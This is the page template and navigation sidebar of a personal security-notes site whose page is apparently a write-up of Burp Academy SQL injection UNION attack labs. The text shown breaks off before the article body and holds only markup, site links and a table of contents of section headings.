
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../SQL%20Injection%20DB%20Enumeration/">
      
      
        <link rel="next" href="../../../CTF/TISC%202022%20%281%29/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.4.8">
    
    
      
        <title>SQL Injection UNION Attack - irboi746's space</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.4b4a2bd9.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.356b1318.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange">
  
    
    
      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#sql-injection-union-attack" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="irboi746&#39;s space" class="md-header__button md-logo" aria-label="irboi746's space" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            irboi746's space
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              SQL Injection UNION Attack
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
      </label>
    
  
</form>
      
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="irboi746&#39;s space" class="md-nav__button md-logo" aria-label="irboi746's space" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    irboi746's space
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Burp Academy
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Burp Academy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Apprentice
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Apprentice
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/Access%20Control%20Vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Access Control Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/Authentication/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentication
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/Business%20Logic%20Vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Business Logic Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CSRF, Clickjacking and CORS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/Cross%20Site%20Scripting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross Site Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/DOM-based%20XSS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DOM based XSS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP Host Header Attacks & File Upload Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/Information%20Disclosure/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Information Disclosure
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/JWT/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    JWT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/Other%20Labs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Other Labs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/SQL%20Injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Apprentice/XXE%20and%20SSRF/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XXE and SSRF
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Practitioner
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Practitioner
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../SQL%20Injection%20DB%20Enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection DB Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    SQL Injection UNION Attack
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    SQL Injection UNION Attack
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query" class="md-nav__link">
    SQL injection UNION attack, determining the number of columns returned by the query
  </a>
  
    <nav class="md-nav" aria-label="SQL injection UNION attack, determining the number of columns returned by the query">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mapping-visible-content" class="md-nav__link">
    Mapping Visible Content
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mapping-attack-surface" class="md-nav__link">
    Mapping Attack Surface
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-analysis-exploitation" class="md-nav__link">
    Vulnerability Analysis / Exploitation
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Analysis / Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#testing-view-details" class="md-nav__link">
    Testing "View Details"
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#testing-category-filter" class="md-nav__link">
    Testing "Category Filter"
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sql-injection-union-attack-finding-a-column-containing-text" class="md-nav__link">
    SQL injection UNION attack, finding a column containing text
  </a>
  
    <nav class="md-nav" aria-label="SQL injection UNION attack, finding a column containing text">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment" class="md-nav__link">
    Vulnerability Assessment
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sql-injection-union-attack-retrieving-data-from-other-tables" class="md-nav__link">
    SQL injection UNION attack, retrieving data from other tables
  </a>
  
    <nav class="md-nav" aria-label="SQL injection UNION attack, retrieving data from other tables">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment_1" class="md-nav__link">
    Vulnerability Assessment
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#database-enumeration" class="md-nav__link">
    Database Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Database Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-database-version" class="md-nav__link">
    Enumerating Database Version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-tables" class="md-nav__link">
    Enumerating Tables
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-columns" class="md-nav__link">
    Enumerating Columns
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_1" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column" class="md-nav__link">
    SQL injection UNION attack, retrieving multiple values in a single column
  </a>
  
    <nav class="md-nav" aria-label="SQL injection UNION attack, retrieving multiple values in a single column">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment_2" class="md-nav__link">
    Vulnerability Assessment
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#database-enumeration_1" class="md-nav__link">
    Database Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Database Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-database-version_1" class="md-nav__link">
    Enumerating Database Version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-tables-in-database" class="md-nav__link">
    Enumerating Tables in Database
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-columns-in-users-table" class="md-nav__link">
    Enumerating Columns in "users" Table
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_2" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CTF
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            CTF
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/TISC%202022%20%281%29/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CSIT TISC 2022 (1)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/TISC%202022%20%282%29/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CSIT TISC 2022 (2)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Flareon22
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            Flareon22
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Flareon22/FlareOn_22/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Flareon-22
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Dev
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Dev
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
        
          
          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Java
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_1">
            <span class="md-nav__icon md-icon"></span>
            Java
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Java/Burp%20Extension%20-%20GUI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Burp Extension - GUI
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Java/Burp%20Extension%20-%20Hello%20World/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Burp Extension - Hello World
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Java/Burp%20Extension%20-%20README/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Burp Extension   README
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
        
          
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Javascript
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Javascript
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Javascript/Node.js/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Node.js
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Javascript/Node.js_Projects/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NodeJS Projects
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
        
          
          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Python
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_3">
            <span class="md-nav__icon md-icon"></span>
            Python
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Python/Web%20Automation%20Cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web Automation Cheatsheet
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Malware Analysis
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Malware Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
        
          
          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Notes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_1">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Notes/File_Identification%26Classification/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File Identification and Classification
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Notes/Introduction/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows Obfuscation Techniques
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Practical Malware Analysis
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            Practical Malware Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Practical_Malware_Analysis/Chapter%200/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 0
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Practical_Malware_Analysis/Chapter%201/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Practical_Malware_Analysis/Chapter%203/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 3
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    OWASP Labs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            OWASP Labs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../OWASP_Labs/Generic%20University/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Generic University
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../OWASP_Labs/crAPI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    crAPI
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    PG
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            PG
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
